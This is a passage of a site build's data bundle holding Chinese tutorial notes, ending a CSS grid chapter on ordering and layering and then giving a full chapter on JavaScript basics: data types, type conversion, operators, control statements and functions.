right</code></h1>\n    <div class="grid small" id="g7">\n        <span class="box01"></span><span class="box02"></span>\n        <span class="box03"></span><span class="box04"></span>\n        <span class="box05"></span>\n    </div>\n    <h1><code>justify-content: left</code></h1>\n    <div class="grid small" id="g8">\n        <span class="box01"></span><span class="box02"></span>\n        <span class="box03"></span><span class="box04"></span>\n        <span class="box05"></span>\n    </div>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n\n\n以上代码效果图：\n\n\n\n# 八、分层和排序\n\n在4.4 元素重叠以及异常处理就出现了元素重叠的现象，它们的重叠顺序是根据网格元素原码顺序而来的，是可以通过传统的z-index进行更改，也可以通过order进行网格元素顺序的更改以达到改变重叠顺序的目的。\n\norder属性设置在网格元素上，用于更改网格元素的顺序，但是如果使用grid-row或grid-column等进行强制的网格元素添加，order会失效。也就是说order一般用于网格流上。\n\n默认情况下，所有网格元素被分配为“0”的顺序。网格元素的order为负值时，将会显示在默认值“0”之前；网格元素的order为正值时，将会显示在默认值“0”之后。如果一些网格元素的order相同，则按照源顺序显示。\n\n<html>\n<head>\n<style>\n    #grid {display: grid; width: 80%; height: 9em;\n        border: 1px solid;\n        grid-auto-flow: column;\n        grid-columns: repeat(5, 1fr);}\n    span {border: 1px dotted red; margin: 3px;}\n    span[class*="box"]::before {content: attr(class);}\n    .box02 { order: -1; }\n    .box03 { order: -2; }\n    .box04 { order: 1; }\n</style>\n</head>\n<body>\n    <div class="grid boxed lines" id="grid">\n        <span class="box01"></span>\n        <span class="box02"></span>\n        <span class="box03"></span>\n        <span class="box04"></span>\n        <span class="box05"></span>\n    </div>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n以上代码效果图：\n',charsets:{cjk:!0}},{title:"1.基础语法",frontmatter:{title:"1.基础语法"},regularPath:"/book-web/html%E3%80%81css%E3%80%81js%E3%80%81ts/%E5%AD%A6%E4%B9%A0JavaScript/1.%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95.html",relativePath:"book-web/html、css、js、ts/学习JavaScript/1.基础语法.md",key:"v-2d9cdc8b",path:"/book-web/html%E3%80%81css%E3%80%81js%E3%80%81ts/%E5%AD%A6%E4%B9%A0JavaScript/1.%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95.html",headers:[{level:2,title:"一、基本概念",slug:"一、基本概念",normalizedTitle:"一、基本概念",charIndex:11},{level:2,title:"二、变量声明",slug:"二、变量声明",normalizedTitle:"二、变量声明",charIndex:1061},{level:2,title:"三、数据类型",slug:"三、数据类型",normalizedTitle:"三、数据类型",charIndex:1282},{level:3,title:"3.1 undefined和null",slug:"_3-1-undefined和null",normalizedTitle:"3.1 undefined和null",charIndex:1543},{level:3,title:"3.2 boolean",slug:"_3-2-boolean",normalizedTitle:"3.2 boolean",charIndex:2138},{level:3,title:"3.3 number",slug:"_3-3-number",normalizedTitle:"3.3 number",charIndex:2608},{level:3,title:"3.4 String类型",slug:"_3-4-string类型",normalizedTitle:"3.4 string类型",charIndex:4462},{level:3,title:"3.5 Object类型",slug:"_3-5-object类型",normalizedTitle:"3.5 object类型",charIndex:5146},{level:2,title:"四、操作符",slug:"四、操作符",normalizedTitle:"四、操作符",charIndex:5612},{level:3,title:"4.1 一元操作符",slug:"_4-1-一元操作符",normalizedTitle:"4.1 一元操作符",charIndex:5664},{level:3,title:"4.2 位操作符",slug:"_4-2-位操作符",normalizedTitle:"4.2 位操作符",charIndex:6313},{level:3,title:"4.3 布尔操作符",slug:"_4-3-布尔操作符",normalizedTitle:"4.3 布尔操作符",charIndex:7514},{level:3,title:"4.4 乘性操作符",slug:"_4-4-乘性操作符",normalizedTitle:"4.4 乘性操作符",charIndex:8070},{level:3,title:"4.5 加性操作符",slug:"_4-5-加性操作符",normalizedTitle:"4.5 加性操作符",charIndex:8720},{level:3,title:"4.6 关系操作符",slug:"_4-6-关系操作符",normalizedTitle:"4.6 关系操作符",charIndex:9745},{level:3,title:"4.7 相等操作符",slug:"_4-7-相等操作符",normalizedTitle:"4.7 相等操作符",charIndex:10265},{level:3,title:"4.8 条件操作符",slug:"_4-8-条件操作符",normalizedTitle:"4.8 条件操作符",charIndex:10753},{level:3,title:"4.9 赋值操作符",slug:"_4-9-赋值操作符",normalizedTitle:"4.9 赋值操作符",charIndex:10875},{level:3,title:"4.10 逗号操作符",slug:"_4-10-逗号操作符",normalizedTitle:"4.10 逗号操作符",charIndex:10939},{level:2,title:"五、语句",slug:"五、语句",normalizedTitle:"五、语句",charIndex:11047},{level:3,title:"5.1 if语句",slug:"_5-1-if语句",normalizedTitle:"5.1 if语句",charIndex:11056},{level:3,title:"5.2 do-while语句",slug:"_5-2-do-while语句",normalizedTitle:"5.2 do-while语句",charIndex:11207},{level:3,title:"5.3 while语句",slug:"_5-3-while语句",normalizedTitle:"5.3 while语句",charIndex:11342},{level:3,title:"5.4 for语句",slug:"_5-4-for语句",normalizedTitle:"5.4 for语句",charIndex:11437},{level:3,title:"5.5 for-in语句",slug:"_5-5-for-in语句",normalizedTitle:"5.5 for-in语句",charIndex:11642},{level:3,title:"5.6 label语句",slug:"_5-6-label语句",normalizedTitle:"5.6 label语句",charIndex:11807},{level:3,title:"5.7 break和continue语句",slug:"_5-7-break和continue语句",normalizedTitle:"5.7 break和continue语句",charIndex:12074},{level:3,title:"5.8 switch语句",slug:"_5-8-switch语句",normalizedTitle:"5.8 switch语句",charIndex:12170},{level:2,title:"六、函数",slug:"六、函数",normalizedTitle:"六、函数",charIndex:12564},{level:3,title:"6.1 理解函数",slug:"_6-1-理解函数",normalizedTitle:"6.1 理解函数",charIndex:12927},{level:3,title:"6.2 没有重载",slug:"_6-2-没有重载",normalizedTitle:"6.2 没有重载",charIndex:13630}],lastUpdated:"7/6/2022, 3:41:21 PM",lastUpdatedTimestamp:1657093281e3,headersStr:"一、基本概念 二、变量声明 三、数据类型 3.1 undefined和null 3.2 boolean 3.3 number 3.4 String类型 3.5 Object类型 四、操作符 4.1 一元操作符 4.2 位操作符 4.3 布尔操作符 4.4 乘性操作符 4.5 加性操作符 4.6 关系操作符 4.7 相等操作符 4.8 条件操作符 4.9 赋值操作符 4.10 逗号操作符 五、语句 5.1 if语句 5.2 do-while语句 5.3 while语句 5.4 for语句 5.5 for-in语句 5.6 label语句 5.7 break和continue语句 5.8 switch语句 六、函数 6.1 理解函数 6.2 没有重载",content:'# 基础语法\n\n\n# 一、基本概念\n\n * 区分大小写：ECMAScript一切（变量、函数名、操作符）都是 区分大小写 的；例如：test和Test变量不是同一个变量，typeOf可作为函数名，但typeof是关键字不能作为函数名。\n\n * 标识符：指变量、函数、属性、参数的 名字；可以是一个或多个字符组合，但 第一个字符不能是数字，其他情况下可用 字母、下划线、美元符号、数字；建议采用 驼峰写法，即第一个字母小写后面单词首字母大写，其实 全部使用小写也可以（不太规范）。\n\n * 注释：\n   \n   // 单行注释\n   /*\n    * 多行注释（为了提高可读性，多行注释前都带上*）\n    */\n   \n   \n   1\n   2\n   3\n   4\n   \n\n * 严格模式：ECMAScript5提出的，对3版本的不确定行为加以处理，不安全的操作也会抛错，写法：\n   \n   function doSomething() {\n       "use strict";\n       // 其他内容\n   }\n   \n   \n   1\n   2\n   3\n   4\n   \n\n * 语句：每句后面可以没有分号，但要是压缩代码就会出错，所以 推荐加上分号，if语句后推荐使用{}，即使只有一句，这样可以提高代码的可读性。\n\n * 关键字：具有特定用途，不能作为标识符。break、case、catch、continue、default、delete、do、else、finally、for、function、if、in、instanceof、new、return、switch、this、throw、try、typeof、var、void、while、with、debugger。\n\n * 保留字：将来可能被用作关键字，也不能作为标识符\n   \n   * 第3版保留字：abstract、boolean、byte、char、double、final、float、goto、int、long、native、short、synchronized、throws、transient、volatile\n   * 第5版严格模式下保留字：implements、interface、package、private、protected、public、static、let、yield\n   * 第5版非严格模式下保留字：class、const、enum、export、extends、import、super\n\n\n# 二、变量声明\n\njs的变量可以用来保存任何类型的数据（松散类型），例如：\n\nvar message = "hi", found = false, age = 29;\n\n\n1\n\n * 不推荐修改变量所保存值的类型，实际上是可以的；\n * 不推荐省略var，虽然省略var可以作为全局变量，但很难维护，并且未经声明的变量赋值在严格模式抛ReferenceError错误；\n * 严格模式下变量名不要取“eval”和“argument”。\n\n\n# 三、数据类型\n\n * ECMAScript有6种数据类型，其中 undefined、null、boolean、number和string 是简单（基本）数据类型，剩下的 Object 是一种复杂数据类型。\n * 因ECMAScript的变量是松散类型，我们可用 typeof操作符 来检测变量的数据类型，写法：typeof message或typeof(message)。它会返回这些字符串："undefined"、"boolean"、"string"、"number"、"object"、"function"。\n\n\n# 3.1 undefined和null\n\nvar message;                        // 这里相当于var message = undefined;\nconsole.log(message == undefined);  // true。message === null的结果就是false，因为此时message就是undefined\nconsole.log(typeof age);            // "undefined"\n\nvar car = null;                     // 常规写法，声明变量一般都会初始化，不知道赋什么那就赋个null也是可以的\nconsole.log(typeof car);            // "object"。null值表示空对象指针，它实际上是个object类型\nconsole.log(null == undefined);     // true。undefined派生自null，但这只是出于比较的目的\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n事实上null和undefined完全不同，我们没有必要将变量显式设为undefined，若要展示保存而未知其值可以null临时将其保存，所以不推荐var message;这种写法，可以var message = null;\n\n\n# 3.2 boolean\n\n布尔类型Boolean：只有两个字面量，true（真）和false（假）。\n\n任何数据类型的值调用Boolean()函数都会返回一个Boolean值：\n\nBOOLEAN()   转换为TRUE值                  转换为FALSE值\nString      任何非空字符串                   ""（空字符串）\nNumber      任何非零数值（包含无穷大）             0和NaN（非数值）\nObject      任何对象                      null\nUndefined   n/a或N/A（not applicable）   undefined\n\n流控制语句（例如if语句）会自动执行相应的Boolean转换\n\nvar message = "hello world";\nif (message) { // 非空字符串转换为true值\n    console.log("Value is true");\n}\n\n\n1\n2\n3\n4\n\n\n\n# 3.3 number\n\n该类型比较受关注，用IEEE754格式来表示 整数和浮点数值，ECMA-262定义了 十进制、八进制、十六进制 三种数字字面量格式。\n其中八进制在严格模式下是无效的；在非严格模式下类似079、08会被解析成十进制的79和9；另外十六进制A-F可大写也可小写。\n\n# 3.3.1 浮点数值\n\n * 该数字要有一个小数点且小数点后至少要有一个数值，但不推荐.1这种写法，即不要省略整数位；\n * 为节省内存1.和10.0这样的值会被转换为整数；\n * 对极大或极小值通常用科学计数法，像0.0000003在默认情况下（带6个零及以上的浮点数）自动转化为e表示法；\n * 需要注意的一点，由于 IEEE754浮点计算通病，0.1+0.2是等于0.30000000000000004（17为小数），0.05+0.25或0.15+0.15不会出现问题，不要直接加，可以使用精度来转化。\n\n# 3.3.2 数值范围\n\n * Number.MIN_VALUE：能表示的最小数值，通常是5e-324；\n * Number.MAX_VALUE：能表示的最大数值，通常是1.7976931348623157e+308；\n * Number.NEGATIVE_INFINITY：-Infinity负无穷\n * Number.POSITIVE_INFINITY：Infinity正无穷\n\nisFinite()函数在参数位于最小与最大数值之间时会返回true，例如：\n\nvar result = Number.MAX_VALUE + Number.MAX_VALUE;\nconsole.log(isFinite(result)); // false\n\n\n1\n2\n\n\n# 3.3.3 NaN\n\nNaN是非数值(Not a Number)，表示一个本来要返回数值的操作数但未返回数值的情况。\n\n有两个特点：\n\n * 任何涉及NaN的操作（例如NaN/10）都会返回NaN；\n * NaN与任何值都不相等，包括NaN本身，NaN == NaN为false。\n\n针对这两个特点定义了isNaN()函数，判断参数是否“不是数值”，函数拿到这个入参时会将这个值 尝试转换为数值，其实调用的是Number()函数。\n\n# 3.3.4 数值转换\n\n使用parseInt()和parseFloat()可以把字符串转化为 整数 和 浮点数。\n\n而使用Number()可以将任何数据类型转化为数值，其规则是：\n\n * 如果是Boolean值，true将被转换为1，false将被转换为0；\n * 如果是null值，返回0，如果是undefined，返回NaN；\n * 如果是字符串：\n   * 有效浮点格式的字符串会被转换为浮点数；\n   * 整数型的字符串八进制的不会被视为八进制（011会转换为11），只会将十六进制和十进制格式的字符串转换为相等大小的十进制整数数值；\n   * 空字符串""转换为0；\n   * 其他情况的字符串会转换为NaN；\n * 如果是对象，先调用对象的valueOf()再按照上述规则转换，然后若得到NaN就去调用toString()再按照上述规则转换\n\nNumber("hello"); // NaN\nNumber(""); // 0\nNumber(true); // 1\n\n\n1\n2\n3\n\n\n可以看出Number()在转化字符串时比较复杂，我们推荐parseInt()来处理整数格式的字符串\n\n * parseInt()在接卸字符串时会忽略前面的空格，直到找到 第一个数字或负号，也就是说parseInt()在字符串还是 非整数格式 或 空字符串 时会返回NaN;\n * 在找到一个数字字符后会继续解析直到遇到 非数字字符；\n * 由于ECMAScript 3和5对八进制字面量解析时存在分歧，所以我们会推荐使用 基数 来指明是按几进制来解析。\n\nparseInt("   1234blue"); // 1234\nparseInt(""); // 空字符串使用parseInt()会解析成NaN，而Number()是0\nparseInt("0xAF", 16); // 按基数16来解析，175\nparseInt("AF"); // 基数16和0x必须要有一个，NaN\nparseInt("10", 2); // 按二进制解析，结果为2，我们非常推荐使用这种写法\n\n\n1\n2\n3\n4\n5\n\n\n\n# 3.4 String类型\n\nString类型用于表示由零或多个16位Unicode字符组成的字符串。\n\n# 3.4.1 转义序列\n\n\\n换行，\\t制表，\\b退格，\\r回车，\\f进纸，\\\\斜杠，\\\'单引号，\\"双引号，\n\\xnn 以十六进制代码nn表示的一个字符（其中n为0~F），例如\\x41表示A，\n\\unnnn 以十六进制代码nnnn表示的一个Unicode字符（其中n为0~F），例如\\u03a3表示Σ，\n其中4个字符长的转义序列和6个字符长的转义序列在字符串中只占1位。\n\n# 3.4.2 字符串的特点\n\n字符串的值是不可变的，有些例子看起来是可变，其实原字符串销毁新字符串创建是在后台完成的。\n\n# 3.4.3 字符串转换\n\n将一个值转换成字符串有两种方式，第一种是使用几乎每个值都有的toString()方法：\n\nvar age = 11, num = 10;\nage.toString(); // "11"\nnum + ""; // "10"\n\n\n1\n2\n3\n\n\ntoString()方法也可以使用基数：\n\nvar num = 10;\nnum.toString(2); // "1010"\n\n\n1\n2\n\n\nnull和undefined值是没有toString()方法的，那么可以使用字符串转换的第二种方式String()，其规则是：传入的值有toString()则会调用toString()，若传入的值是null、undefined则返回"null"、"undefined"这样的字符串。\n\n其实转化为字符串有种更快捷的方法就是xxx + ""\n\n\n# 3.5 Object类型\n\nECMAScript中的对象其实就是一组 数据和功能 的集合。对象可以通过执行new操作符后跟要创建类型的名称来创建。Object类型是所有它的实例的基础，它所具有的属性和方法在更具体的对象中同样存在。\n\nObject的每个实例都具有以下属性个方法：\n\n * constructor：构造函数；\n * hasOwnProperty(propertyName)：用于检查给定的属性在当前对象实例中是否存在，而不是在实例的原型中；\n * isPrototypeOf(object)：用于检查传入的对象，是否是当前对象的原型；\n * propertyIsEnumerable(propertyName)：用于检查给定的属性是否能使用for-in枚举；\n * toLocaleString()：返回对象的字符串表示，该字符串与执行环境的地区对应；\n * toString()：返回对象的字符串表示；\n * valueOf()：返回对象的字符串、数值或布尔值，通常与toString()方法的返回值相同。\n\n\n# 四、操作符\n\n可以操作字符串、数值、布尔值、对象（调valueOf()和toString()）\n\n\n# 4.1 一元操作符\n\n只能操作一个值。\n\n# 4.1.1 递增和递减操作符\n\n分为前置型和后置型。\n\nvar num1 = 2, num2 = 20;\nvar num3 = --num1 + num2; // 等于21，前置型会先自己“减减”再去参与外界计算\nvar num4 = num1++ + num2; // 等于21，上一步num1为1，这一步是先参与外界计算，后才自己去“加加”\n\n\n1\n2\n3\n\n\n上述对于数值，对于 其他类型也可用，只是自动调用了Number()函数，再去操作“++”、“--”\n\n# 4.1.2 一元加和一元减操作符\n\n加号（+）放在数值前面对数值没有影响，而一元减相当于添加了符号。在一元加和一元减对非数值应用时跟一元操作符类似也调用了Number()函数。\n\nvar s1 = "01"; s1 = -s1; // s1的值变为了 -1\nvar s2 = "1.1"; s2 = -s2; // s2的值变为了 -1.1\nvar s3 = "z"; s3 = -s3; // s3的值变为了 NaN\nvar b = false; s2 = -s2; // b的值变为了 0\nvar f = 1.1; f = -f; // f的值变为了 -1.1\nvar o = {\n  valueOf: function() {\n    return -1;\n  }\n};\no = -o; // o的值变为了 1\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n\n# 4.2 位操作符\n\n * ECMAScript中所有数字都以64位格式存储，但位操作符是操作32位格式的，所以操作前后是转换的；第32位是符号位：0表示正数，1表示负数；\n * 负数在二进制中是以“二进制补码”格式存储的，计算补码的步骤：\n   * 求这个数值绝对值的二进制码\n   * 求二进制反码\n   * 在二进制反码上加1\n * 而ECMAScript会尽力隐藏这些信息，一般是将这个负数的绝对值的二进制码前加一个负号，例如：var num = -18; num.toString(2); // “-10010”\n * NaN和Infinity值应用位操作符时会被当成0处理，而对于非数值应用操作符会先用Number()函数将值转化为数值（自动完成的），后再用位操作符。\n\n# 4.2.1 按位非(NOT)\n\n按位非操作符由一个波浪线（~）表示，按位非歧视就是求反码。\n\nvar num1 = 25;\nvar num2 = ~num1; // 等价于 var num2 = -num - 1;即操作数的负值减1\nconsole.log(num2); // -26   ~在底层执行速度要更快\n\n\n1\n2\n3\n\n\n# 4.2.2 按位与(AND)\n\n按位与操作符由一个和号（&）表示，它有两个操作数。\n按位与操作只在两个数值的对应位都是1时才返回1，任意一位是0都返回0。\n\n# 4.2.3 按位或(OR)\n\n按位或操作符由一个竖线（|）表示，它也有两个操作数。\n按位或操作在两个数值的对应位至少有一个1就可返回1，都是0才返回0。\n\n# 4.2.4 按位异或(XOR)\n\n按位异或操作符由一个插入符号（^）表示，它也有两个操作数。\n按位异或操作在两个数值的对应位不同时返回1，都是1或都是0才返回0.\n\n# 4.2.5 左移\n\n左移操作符由两个小于号（<<）表示，符号右侧是要向左移的位数。\n这个左移不会影响操作数的符号位，2左移5位是64，而-2就是-64。\n\n# 4.2.6 有符号的右移\n\n有符号的右移操作符由两个大于号（>>）表示，它右移空出的位置是用符号位的值来填充的。\n\n# 4.2.7 无符号右移\n\n无符号右移操作符由3个大于号（>>>）表示面对整数来说>>和>>>结果相同。但对负数来说，右移空出的位置是用0填充的不再是符号位（负数符号位是1）。\n\nvar value1 = -64;           // 二进制11111111111111111111111111000000\nvar value2 = value1 >> 5;   // 二进制11111111111111111111111111111110\nvar value3 = value1 >>> 5;  // 二进制00000111111111111111111111111110\n\n\n1\n2\n3\n\n\n\n# 4.3 布尔操作符\n\n# 4.3.1 逻辑非\n\n逻辑非操作符由一个叹号（!）表示，其实它相当于先调用Boolean()函数再取反，而!!""里的两个!就相当于Boolean()了，Boolean()函数转换规则可以参考之前的小节。\n\n# 4.3.2 逻辑与\n\n逻辑与操作符由两个和号（&&）表示，有两个操作数，真值表类似按位与。\n\n * 如果第一个操作数是对象或第一个操作数（可能是表达式）求值结果为true时，它会返回第二操作数，否则返回一个操作数；\n * 如果第一个操作数就是null、NaN、undefined，就直接返回null、NaN、undefined；\n * 如果第一个操作数结果为true或对象，第二个操作数不能是未定义，否则会报错。\n\n# 4.3.3 逻辑或\n\n逻辑或操作符由两个竖线符号（||）表示，有两个操作符，真值表类似按位或。\n\n * 如果第一个操作数是空对象(null)或第一个操作数（可能是表达式）求值结果为false，会返回第二个操作数，否则返回第一个操作数；\n * 如果两个操作数都是null、NaN、undefined，则返回null、NaN、undefined；\n * 如果第一个操作数结果为false或空对象(null)，第二个操作数不能是未定义的，否则会报错。\n\n\n# 4.4 乘性操作符\n\nECMAScript定义了3个乘性操作符：乘法、除法和求模。操作数为非数值时会自动调用Number()函数来转换。\n\n# 4.4.1 乘法\n\n乘法操作符由一个星号（*）表示，特殊规则：\n\n * 如果有一个操作数是NaN，则结果是NaN（之前小节里有说过）；\n * 如果Infinity与0相乘，则结果是NaN（数学上规定∞ * 0和0/0和∞/∞是没有意义的，计算不出来）；\n * 如果Infinity与非0数值相乘，结果是Infinity或-Infinity；\n * 如果Infinity与Infinity相乘，结果是Infinity。\n\n# 4.4.2 除法\n\n除法操作符由一个斜线符号（/）表示，特殊规则：\n\n * 如果有一个操作数是NaN，则结果是NaN（之前小节里有说过）；\n * 如果零被零除，则结果是NaN（数学上规定∞ * 0和0/0和∞/∞是没有意义的，计算不出来）；\n * 如果是非0数值被零除，结果是Infinity或-Infinity；\n * 如果是Infinity被Infinity除，结果是NaN。\n\n# 4.4.3 求模\n\n求模（余数）操作符由一个百分号（%）表示，特殊规则：\n\n * 如果被除数是无穷大而除数是有限大的数字，则结果是NaN；\n * 如果被除数是有限大的数值而除数是0，则结果是NaN；\n * 如果是Infinity被Infinity除，则结果是NaN；\n * 如果被除数是有限大的数值而除数是无穷大的数值，结果是被除数；\n\n\n# 4.5 加性操作符\n\n# 4.5.1 加法\n\n加法操作符（+）的用法：\n\n * 如果有一个操作数是NaN，则结果是NaN（之前小节里有说过）；\n * 同号的Infinity相加结果还是同号的Infinity；\n * 异号的Infinity相加则是NaN；\n * 同号0相加还是同号0（结果与第一个操作数保持一致）；\n * 异号0相加却是+0\n * 如果其中一个操作数是字符串，另一个操作数是对象、数值或布尔值就会自动调用toString()方法取得字符串值并进行拼接，但另一个操作数是null、undefined则会自动调用String()函数取得字符串并进行拼接。\n * 如果操作数为对象（{}）或者是数组（[]）这种复杂的数据类型，那么就将两个操作数都转换为字符串，进行拼接\n\n隐式转换面试题：\n\n[] + []; // []转化为字符串是""，有最后拼起来结果就是""\n[] + {}; // []转化为字符串是""，{}转化为字符串是"[object Object]"，所有最后拼起来结果就是"[object Object]"\n{} + []; // 编译器将开头的{}理解为空代码块，那么这里“{} + []”相当于“+[]”，又相当于“Number([])”，那结果就是0；有些编译器会高级一点那就跟“[] + {}”结果一样是"[object Object]"\n{} + {}; // 跟上面同样道理，相当于“+{}”又相当于Number({})，其结果就是NaN；有些编译器就是两个{}的字符串的拼接，其结果是"[object Object][object Object]"\n\n\n1\n2\n3\n4\n\n\nJS的{} + {}与{} + []的结果是什么？\n\n# 4.5.2 减法\n\n减法操作符（-）的用法：\n\n * 如果有一个操作数是NaN，则结果是NaN（之前小节里有说过）；\n * 同号的Infinity相减则是NaN；\n * 异号的Infinity相减是Infinity，符号视情况而定；\n * 同号0相减是+0；异号0相减结果与第一个操作数保持一致；\n * 如果其中一个操作数是字符串、布尔值、null、undefined，则先调用Number()函数转换为数值再执行减法计算，担忧一个操作数是对象，则会调用valueOf()方法，如果没有valueOf()方法则会调用toString()得到字符串再转化为数值去计算。\n\n\n# 4.6 关系操作符\n\n小于（<）、大于（>、小于等于（<=）、大于等于（>=，相应规则：\n\n * 如果一个操作数是数值，则将另一个操作数转换为一个数值；\n * 如果一个操作数是对象，则调用这个对象的valueOf()方法，如果没有valueOf()方法则调用toString()方法；\n * 如果两个操作数都是字符串，则比较两个字符串对应位置的字符编码值。\n\nvar result = "Brick" < "alphabet"; // true，B的字符编码是66，a的字符编码是97\nvar result = "Brick".toLowerCase() < "alphabet".toLowerCase(); // false，都转换为小写，b的字符编码大于a的\nvar result = "23" < "3"; // true，因为先比较第一位也就是"2"比"3"\nvar result = "23" < 3; // false，如果一个操作数是数值，则将另一个操作数转换为一个数值\nvar result = "a" < 3; // false，任何操作数与NaN进行关系比较时，其结果都为false\n\n\n1\n2\n3\n4\n5\n\n\n\n# 4.7 相等操作符\n\n# 4.7.1 相等和不相等\n\n两个等于号（==）表示相等操作符，叹号后跟等于号（!=）表示不相等操作符，这两个操作符都会先转换操作数（强制转型），然后再比较他们的相等性。\n\n * 如果一个操作数是数值，另一个操作数是布尔值或字符串会先调用Number()函数转换成数值去比较相等性；\n * null和undefined比较相等性，是相等的，他们比较时没有去转换换成数值的；\n * 如果有一个操作数是NaN，不管第二个操作数还是不是NaN，其相等操作符都会返回false，不相等操作符返回true（NaN不等于NaN）；\n * 如果两个操作数都是对象，则比较他们是不是同一个对象，如果两个操作数都指向同一个对象，则相等操作符返回true，否则返回false。\n\n# 4.7.2 全等和不全等\n\n三个等于号（===）表示全等操作符，叹号后跟两个等于号（!==）表示不全等操作符，这两个操作符不但不转换操作数并且会先比较类型是否相同再比较相等性。null == undefined 返回true，null === undefined返回false。\n\n\n# 4.8 条件操作符\n\n也是三元运算符xxx ? xxx : xxx，例如：var max = (num1 > num2) ? num 1 : num2;如果num1大于num2，那就返回中间num1的值，否则返回最后一个num2的值。\n\n\n# 4.9 赋值操作符\n\n*=，/=，%=，+=，-=，<<=，>>=，>>>=，主要是简化写法，其实没有任何性能的提升。\n\n\n# 4.10 逗号操作符\n\n可以执行多个操作、赋值\n\nvar num1 = 1, num2 = 2, num3 = 3;\nvar num = (5, 1, 4, 8, 0); // num的值为0\n\n\n1\n2\n\n\n\n# 五、语句\n\n\n# 5.1 if语句\n\nif (i > 25) {\n  console.log("Greater than 25.");\n} else {\n  console.log("Less than or equal to 25.");\n}\n\n\n1\n2\n3\n4\n5\n\n\n推荐使用代码块，即使只有一行代码执行\n\n\n# 5.2 do-while语句\n\nvar i = 0;\ndo {\n  i +=2;\n} while (i < 10); // i 小于10就会继续循环\nconsole.log(i);\n\n\n1\n2\n3\n4\n5\n\n\n不管表达式的结果如何，循环体内的代码至少会执行一次\n\n\n# 5.3 while语句\n\nvar i = 0;\nwhile (i < 10) {\n  i += 2;\n}\n\n\n1\n2\n3\n4\n\n\n只有表达式结果为true时才会去执行循环体内的代码\n\n\n# 5.4 for语句\n\nvar count = 10;\nfor (var i = 0; i < count; i ++) {\n  console.log(i);\n}\nconsole.log(i); // 10\n\n\n1\n2\n3\n4\n5\n\n\n有三个表达式“初始化语句”、“循环条件”、“每执行完一次后的更变语句”。\n由于ECMAScript中不存在 块级作用域，因此在循环内部定义的变量也可以在外部访问到。\n\n\n# 5.5 for-in语句\n\nfor (var propName in window) {\n  document.write(propName);\n}\n\n\n1\n2\n3\n\n\n精准的迭代语句，可以用来枚举对象的属性，对null和undefined使用for-in会报错，所以使用前要判断对象是否为null或undefined。\n\n\n# 5.6 label语句\n\n在代码中添加标签，一遍将来使用，一般与break或continue配合使用\n\nvar a = 0;\nlabel1:\nfor (var i = 0; i < 10; i ++) {\n  for (var j = 0; j < 20; j ++) {\n    a = i + \',\' + j;\n    if (i === 3 && j === 2) {\n      break label1;\n    }\n  }\n}\nconsole.log(a);\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n\n# 5.7 break和continue语句\n\nbreak语句会立即退出这一层的循环（这层的for循环），而continue是立即退出本次循环（for循环里会循环好几次，跳出这一次的）。\n\n\n# 5.8 switch语句\n\nswitch (i) {\n  case 25:\n    console.log(25);\n    break;\n  case 35:\n    console.log(35);\n    break;\n  case 45:\n    console.log(45);\n    break;\n  default:\n    console.log("other");\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\ncase里要是不带break的话，就会继续执行后面的case；default相当于else它不需要break； switch语句可以使用任何数据类型，case的值可以是变量或表达式； switch去比较使用的是全等“===”； 它在一些情况下可以替代if () {} else if () {} else {}这样逻辑。\n\n\n# 六、函数\n\nECMAScript中的函数使用function关键字来声明，后跟一组参数及函数体。\n\nfunction sagHi (name, message) {\n  console.log("Hello " + name + "," + message);\n}\nsagHi("Nicholas", "how are you today?"); // "Hello Nicholas,how are you today?"\n\n\n1\n2\n3\n4\n\n\n任何函数都可使用return语句跟要返回的值来实现函数返回某值，并且函数都不需要定义返回值类型，return;后的语句是不可能再执行的\n\n严格模式对函数有一些限制：\n\n * 不能把函数或参数名取为eval或arguments；\n * 不能出现两个命名参数同名的情况。\n\n\n# 6.1 理解函数\n\nECMAScript函数有一个重要特点：命名的参数只提供便利，但不是必须的。意思是函数命名的参数只是为了告诉外部我大概需要几个什么样的参数，实际上调用函数时解析器不会拿传参和命名时的参数去做比较，不关心你传进来几个参数也不关心类型，只会把你的入参放在类似数组的arguments对象中，可以通过arguments[n]来访问第n个参数可以通过length属性来确定多少个参数传进来了。\n\nfunction doAdd() {\n  if (arguments.length == 1) {\n    console.log(arguments[0] + 10);\n  } else if (arguments.length == 2) {\n    console.log(arguments[0] + arguments[1]);\n  }\n}\ndoAdd(10); // 20\ndoAdd(30, 20); // 50\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n这个特性算不上完美的重载，但也足够弥补ECMAScript的这一缺憾了。\n\nfunction doAdd(num1, num2) {\n  arguments[1] = 10;\n  console.log(arguments[0] + num2);\n}\n\n\n1\n2\n3\n4\n\n\n每次执行doAdd()函数都会重写第二个参数，arguments[1]和num2的值都会变为10，但他们的内存空间是独立只是值同步。如果num2在外部没有传值进来时是赋予的undefined。还有严格模式下arguments的值不能被重写。\n\n\n# 6.2 没有重载\n\n * 重写 子类覆盖父类的方法（返回值和形参都不能改变，方法体改变了，也就是核心变了），在js里重写是可以的。\n * 重载：在同一个类里（执行环境），方法名相同而形参列表和方法体不一样的函数叫重载，这在js里是不存在的。\n * 因为js里使用var和function这样的关键字来声明 同名变量 时，都会以最后一个声明为准，它会覆盖之前所有 同名 的声明；js里的同名函数的声明就是重载的写法，因为在同一个执行环境里，但由于同名的会被覆盖，那么js里没有函数重载这一说法。\n\nfunction addSomeNumber(num) {\n  return num + 100;\n}\nfunction addSomeNumber(num) {\n  return num + 200;\n}\nvar result = addSomeNumber(100); // 